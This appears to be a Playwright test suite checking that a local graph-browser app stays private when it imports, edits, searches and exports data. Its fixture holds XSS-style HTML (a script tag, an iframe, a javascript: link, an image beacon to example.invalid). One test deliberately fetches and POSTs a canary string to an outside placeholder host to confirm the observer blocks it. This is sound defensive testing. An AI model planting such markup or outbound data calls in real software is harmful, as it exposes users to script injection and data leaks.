import {test,expect} from '@playwright/test';
import {readFile} from 'node:fs/promises';
import {parseDocument} from 'fm4/fm/io';
import {fillNumeric,selectChoice} from '../../scripts/browser-controls.mjs';

const canary='FM4PRIVATECANARY7X';
const fixture={format:'freshmind',version:1,title:canary,nodes:[
  {id:'a',label:`graph ${canary}`,annotation:{format:'html',text:`<p>${canary}<img src="https://example.invalid/${canary}"><script>window.assuranceExecuted=1</script><iframe src="/${canary}"></iframe><a href="javascript:window.assuranceExecuted=2">unsafe</a></p>`},data:{private:canary}},
  {id:'b',label:'graph spring layout',annotation:{format:'text',text:canary}},
  {id:'hidden',label:'topic search',data:{private:canary}}
],edges:[{id:'manual',from:'a',to:'b',label:'uses',weight:2},{id:'parallel',from:'a',to:'b',label:'also uses',weight:0},{id:'loop',from:'b',to:'b',label:'self'}]};
const buffer=value=>({name:'assurance.fm.yaml',mimeType:'application/yaml',buffer:Buffer.from(JSON.stringify(value))});
async function observe(context,page,baseURL){
  const blocked=[],requests=[],logs=[],errors=[],sockets=[];
  const origin=new URL(baseURL).origin;
  await context.route('**/*',async route=>{
    const request=route.request(),url=new URL(request.url());
    const text=JSON.stringify({url:request.url(),body:request.postData(),headers:request.headers()});
    // Independent static-distribution allowlist, not inferred from observed traffic.
    const allowed=url.origin===origin&&request.method()==='GET'&&!url.search&&
      (/^\/$/.test(url.pathname)||/^\/assets\/[A-Za-z0-9._-]+\.(?:js|css|yaml|svg|png|woff2)$/.test(url.pathname)||url.pathname==='/favicon.ico');
    requests.push({url:request.url(),method:request.method()});
    if(!allowed||text.includes(canary)){blocked.push({url:request.url(),method:request.method()});await route.abort();}else await route.continue();
  });
  page.on('console',m=>logs.push(m.text()));page.on('pageerror',e=>errors.push(e.message));page.on('websocket',ws=>sockets.push(ws.url()));
  await context.addInitScript(()=>{
    window.assuranceEffects=[];
    for(const [prototype,method] of [[Storage.prototype,'setItem'],[IDBFactory.prototype,'open'],[CacheStorage.prototype,'open']]){
      const original=prototype[method];prototype[method]=function(...args){window.assuranceEffects.push({method,args:args.map(String)});return original.apply(this,args);};
    }
  });
  return {blocked,requests,logs,errors,sockets};
}

test('ASSURE-05 production local import, hostile content, edits, lexical/LDA workers and explicit exports preserve privacy',async({context,page,baseURL},testInfo)=>{
  const seen=await observe(context,page,baseURL);
  await page.goto('/');await page.waitForFunction(()=>window.graphBrowser);
  await page.locator('#open-graph-files').setInputFiles(buffer(fixture));
  await expect(page.locator('#file-status')).toContainText('3 nodes, 3 relations');
  await page.evaluate(async()=>{const p=window.graphBrowser;p.fastFinishAnimation();await p.getLocalityUtils().whenIdle();p.tgLayout.stop();p.setSelect(p.findNode('a'));});
  await page.locator('#graph svg').focus();await page.keyboard.press('Space');
  const dialog=page.getByRole('dialog',{name:/^Node content:/});await expect(dialog).toContainText(canary);
  await expect(dialog.locator('script,img,iframe,[onclick]')).toHaveCount(0);
  expect(await page.evaluate(()=>window.assuranceExecuted)).toBeUndefined();await page.keyboard.press('Escape');
  // Real shared editing overlay: the canary enters an accepted graph field.
  await page.locator('#graph svg').focus();await page.keyboard.press('Control+Space');
  await page.locator('#node-annotation').fill(`edited ${canary}`);await page.locator('#save-item').click();
  await page.locator('#search-section').evaluate(e=>e.open=true);
  await selectChoice(page.locator('#search-engine'),'lexical');await page.locator('#search-query').fill(canary);await page.locator('#search-run').click();
  await expect(page.locator('#search-status')).toContainText(/results? linked/);
  await selectChoice(page.locator('#search-engine'),'lda');await page.locator('#search-section .control-subsection').evaluate(e=>e.open=true);
  await fillNumeric(page.locator('#search-topics'),'2');await fillNumeric(page.locator('#search-iterations'),'20');await page.locator('#search-train').click();
  await expect(page.locator('#search-status')).toContainText('Topic model ready');await page.locator('#search-run').click();
  await expect(page.locator('#search-status')).toContainText(/results? linked/);
  const modelDownload=page.waitForEvent('download');await page.locator('#search-save-model').click();
  const model=JSON.parse(await readFile(await (await modelDownload).path(),'utf8'));expect(JSON.stringify(model)).toContain(canary);
  const graphDownload=page.waitForEvent('download');await page.locator('#save-graph').click();
  const saved=await readFile(await (await graphDownload).path(),'utf8'),document=parseDocument(saved);
  for(const {id,label} of fixture.nodes){expect(document.graph.findNode(id).getLabel()).toBe(label);}
  for(const {id,from,to,label} of fixture.edges){const e=[...document.graph.getEdges()].find(e=>e.getID()===id);expect([e.from.getID(),e.to.getID(),e.getLabel()]).toEqual([from,to,label]);}
  expect(document.graph.findNode('a').getAnnotation().text).toBe(`edited ${canary}`);
  // Invalid replacement must not discard the accepted graph or its search associations.
  const count=await page.evaluate(()=>window.graphBrowser.getNodeCount());
  await page.locator('#open-graph-files').setInputFiles(buffer({...fixture,edges:[{id:'bad',from:'a',to:'missing'}]}));
  await expect(page.locator('#file-status')).toContainText('unknown endpoint');expect(await page.evaluate(()=>window.graphBrowser.getNodeCount())).toBe(count);
  const storage=await page.evaluate(async()=>({local:{...localStorage},session:{...sessionStorage},databases:await indexedDB.databases(),caches:await caches.keys(),effects:window.assuranceEffects,serviceWorkers:(await navigator.serviceWorker.getRegistrations()).length}));
  expect(seen.blocked).toEqual([]);expect(seen.sockets).toEqual([]);expect(seen.errors).toEqual([]);
  expect(seen.logs.some(s=>s.includes(canary))).toBe(false);
  expect(storage).toEqual({local:{},session:{},databases:[],caches:[],effects:[],serviceWorkers:0});
  expect(seen.requests.some(r=>/\/assets\/worker-.*\.js$/.test(r.url))).toBe(true);
  await testInfo.attach('local-effects.json',{body:JSON.stringify({browser:page.context().browser().version(),requests:seen.requests,storage,limits:'One synthetic production workflow; no extension/OS/other-browser or universal privacy claim.'},null,2),contentType:'application/json'});
});

test('ASSURE-06 privacy observer detects attempted same-origin and external canary transfer',async({context,page,baseURL})=>{
  const seen=await observe(context,page,baseURL);await page.goto('/');
  await page.evaluate(async marker=>{await Promise.allSettled([fetch(`/unexpected?data=${marker}`),fetch(`https://example.invalid/${marker}`,{method:'POST',body:marker})]);},canary);
  expect(seen.blocked).toHaveLength(2);expect(seen.blocked.every(r=>r.url.includes(canary))).toBe(true);
});
